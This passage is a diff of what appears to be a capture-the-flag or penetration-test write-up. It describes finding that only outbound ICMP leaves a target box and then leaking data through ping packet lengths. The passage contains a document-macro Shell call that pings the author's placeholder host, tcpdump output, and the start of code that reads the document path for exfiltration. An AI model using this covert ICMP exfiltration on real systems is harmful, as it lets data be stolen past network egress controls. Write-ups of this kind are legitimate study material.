@@ -23,10 +23,14 @@ TCPDUMP from home with ICMP on. Bingo, we go packets We went and wrote few more 
 - NO Outgoing TCP Allowed
 - NO Outgoing UDP Allowed (ppp solved it with DNS)
 
- Concluded only ICMP able to to go out from the box. So, we did another test. 
+Concluded only ICMP able to to go out from the box. So, we did another test. 
+
 Shell ("ping -n 1 -l 2 my.ip.add.ress")
+
 And we received 
+
 11:29:43.643405 IP 54.92.10.249 > my.ip.add.ress: ICMP echo request, id 1, seq 2249, length 10
+
 This is clear that we can somehow use the length to pass some data. So, first thing is. We want to know where are we.
 
 strString = (ActiveDocument.Path)
